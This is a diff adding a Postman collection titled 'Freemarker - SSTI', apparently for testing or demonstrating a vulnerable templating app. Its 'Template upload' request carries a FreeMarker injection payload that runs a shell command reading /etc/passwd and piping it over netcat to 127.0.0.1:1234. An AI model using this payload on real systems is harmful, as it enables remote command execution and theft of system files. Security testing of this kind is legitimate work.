@@ -1,0 +1,49 @@
+{
+	"info": {
+		"_postman_id": "c171d457-4661-4272-a883-175203fbb582",
+		"name": "Freemarker - SSTI",
+		"schema": "https://schema.getpostman.com/json/collection/v2.0.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Hello World",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n\t\"name\": \"John\"\n}"
+				},
+				"url": "{{host}}/hello"
+			},
+			"response": []
+		},
+		{
+			"name": "Template upload",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"type": "text",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n\t\"hello.ftl\": \"<!DOCTYPE html><html lang=\\\"en\\\"><head><meta charset=\\\"UTF-8\\\"><#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"bash -c {cat,/etc/passwd}|{nc,127.0.0.1,1234}\\\") }<title>Hello!</title><link href=\\\"/css/main.css\\\" rel=\\\"stylesheet\\\"></head><body><h2 class=\\\"hello-title\\\">Hello!</h2><script src=\\\"/js/main.js\\\"></script></body></html>\"\n}"
+				},
+				"url": "{{host}}/template"
+			},
+			"response": []
+		}
+	]
+}
